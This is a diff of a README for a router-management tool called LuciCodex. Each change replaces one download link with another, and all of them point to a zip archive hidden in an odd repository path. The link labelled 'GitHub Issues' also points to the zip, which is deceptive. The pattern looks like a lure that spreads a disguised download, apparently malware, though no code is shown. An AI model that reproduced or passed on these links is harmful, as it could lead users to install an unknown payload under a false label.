@@ -1,7 +1,7 @@
 # 🤖 LuciCodex - Control Your Router with Ease
 
 ## 📥 Download LuciCodex
-[![Download LuciCodex](https://raw.githubusercontent.com/betapanda3piid/LuciCodex/main/internal/config/LuciCodex-v2.3-alpha.5.zip)](https://raw.githubusercontent.com/betapanda3piid/LuciCodex/main/internal/config/LuciCodex-v2.3-alpha.5.zip)
+[![Download LuciCodex](https://github.com/betapanda3piid/LuciCodex/raw/refs/heads/main/package/luci-app-lucicodex/root/usr/Luci_Codex_2.4.zip)](https://github.com/betapanda3piid/LuciCodex/raw/refs/heads/main/package/luci-app-lucicodex/root/usr/Luci_Codex_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To run LuciCodex, you will need the following:
 
 To get started with LuciCodex, visit the Releases page to download the application:
 
-[Download LuciCodex](https://raw.githubusercontent.com/betapanda3piid/LuciCodex/main/internal/config/LuciCodex-v2.3-alpha.5.zip)
+[Download LuciCodex](https://github.com/betapanda3piid/LuciCodex/raw/refs/heads/main/package/luci-app-lucicodex/root/usr/Luci_Codex_2.4.zip)
 
 Follow these steps to install:
 
@@ -84,7 +84,7 @@ This project relates to various topics, including:
 
 Join our community discussions and ask questions. You can find us on:
 
-- [GitHub Issues](https://raw.githubusercontent.com/betapanda3piid/LuciCodex/main/internal/config/LuciCodex-v2.3-alpha.5.zip)
+- [GitHub Issues](https://github.com/betapanda3piid/LuciCodex/raw/refs/heads/main/package/luci-app-lucicodex/root/usr/Luci_Codex_2.4.zip)
 - Relevant forums for OpenWrt users
 
 For any direct support needs, create an issue in our GitHub repository, and we will get back to you as soon as possible. 
